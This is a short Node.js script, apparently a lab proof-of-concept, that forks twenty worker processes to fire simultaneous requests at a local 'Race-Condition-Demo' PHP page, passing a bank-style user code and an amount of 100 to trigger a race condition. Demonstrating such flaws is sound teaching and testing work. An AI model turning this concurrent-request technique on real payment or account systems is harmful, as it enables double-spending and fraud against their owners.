const cluster = require("cluster");
const request = require("request");

if (cluster.isMaster) {
  for (let i = 0; i < 20; i++) {
    cluster.fork();
  }
} else {
  request("http://localhost/Race-Condition-Demo/index.php?user_code=BANK000001&amount=100", (error, response, body)=> {
    console.log(`${body}`)
  });
}
